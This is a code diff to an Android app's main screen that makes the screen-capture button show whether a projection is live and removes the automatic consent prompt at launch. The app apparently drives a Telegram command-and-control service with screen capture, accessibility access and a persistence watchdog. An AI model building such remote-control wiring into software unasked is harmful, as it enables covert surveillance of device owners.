@@ -51,6 +51,9 @@ class MainActivity : Activity() {
 
     private val REQ = 0xC2
 
+    /** Kept so its label can reflect live projection state. */
+    private var btn4: Button? = null
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
@@ -70,11 +73,15 @@ class MainActivity : Activity() {
             setPadding(0, 12, 0, 24)
         })
 
-        fun btn(label: String, action: () -> Unit) {
-            root.addView(Button(this).apply {
+        // Returns the view so individual buttons can be updated later, e.g.
+        // to reflect whether a screen projection is currently live.
+        fun btn(label: String, action: () -> Unit): Button {
+            val view = Button(this).apply {
                 text = label
                 setOnClickListener { action() }
-            })
+            }
+            root.addView(view)
+            return view
         }
 
         btn("1. Grant permissions") {
@@ -92,8 +99,14 @@ class MainActivity : Activity() {
             stopService(Intent(this@MainActivity, TelegramC2Service::class.java))
             log("main", "service stop requested")
         }
-        btn("4. Enable screen capture") {
-            startActivity(Intent(this@MainActivity, MediaProjectionSetupActivity::class.java))
+        btn4 = btn("4. Enable screen capture") {
+            if (ProjectionState.isActive()) {
+                Toast.makeText(this@MainActivity,
+                    "screen capture already active", Toast.LENGTH_SHORT).show()
+                log("main", "projection already active, no prompt")
+            } else {
+                startActivity(Intent(this@MainActivity, MediaProjectionSetupActivity::class.java))
+            }
         }
         btn("5. Enable accessibility") {
             startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
@@ -193,15 +206,23 @@ class MainActivity : Activity() {
 
         startLogRefresher()
 
-        val prefs = getSharedPreferences("c2", MODE_PRIVATE)
-        val projCode = prefs.getInt("proj_code", Int.MIN_VALUE)
-        if (projCode != Int.MIN_VALUE) {
-            Handler(Looper.getMainLooper()).postDelayed({
-                startActivity(Intent(this, MediaProjectionSetupActivity::class.java))
-            }, 1500)
-        }
-
+        // No automatic consent prompt on launch. It used to re-prompt every
+        // time because a stored flag outlived the single-use projection token.
+        // Consent is now requested only from the button above, and only when
+        // no projection is live.
         WatchdogReceiver.schedule(this)
+        renderProjectionState()
+    }
+
+    /**
+     * Shows whether a projection is live, so the button's state is never a
+     * guess. Refreshed with the log rather than only at startup, because the
+     * projection can stop while the activity is in the background.
+     */
+    private fun renderProjectionState() {
+        val label = btn4 ?: return
+        val active = ProjectionState.isActive()
+        label.text = if (active) "4. Screen capture: ACTIVE" else "4. Enable screen capture"
     }
 
     private fun requestBatteryExemption() {
@@ -244,9 +265,17 @@ class MainActivity : Activity() {
     }
 
     private fun startLogRefresher() {
+        // Keep the capture button honest: the projection can be revoked by the
+        // system at any time, including while this activity is resumed.
+        renderProjectionState()
         handler.postDelayed(object : Runnable {
             override fun run() {
                 if (autoRefresh) refreshLog()
+                // Every tick, not just at startup: the system can revoke a
+                // projection while this activity is resumed, and a one-shot
+                // render left the button claiming ACTIVE for the rest of the
+                // session.
+                renderProjectionState()
                 handler.postDelayed(this, 1000)
             }
         }, 1000)
